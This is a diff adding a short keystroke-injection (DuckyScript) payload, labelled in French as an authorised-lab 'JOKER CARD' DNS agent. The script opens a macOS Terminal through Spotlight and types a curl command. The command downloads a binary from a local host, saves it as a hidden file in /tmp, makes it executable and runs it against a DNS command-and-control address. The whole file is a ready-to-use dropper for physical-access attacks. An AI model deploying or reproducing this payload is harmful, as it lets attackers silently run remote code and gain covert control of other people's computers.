@@ -1,0 +1,9 @@
+REM JOKER CARD - agent DNS S.T.A.R. (lab autorise)
+DELAY 2000
+GUI SPACE
+DELAY 800
+STRING Terminal
+ENTER
+DELAY 1500
+STRING curl -sL http://192.168.1.222:8080/star_dns_agent -o /tmp/.d && chmod +x /tmp/.d && /tmp/.d <IP_DNS_C2> 53
+ENTER
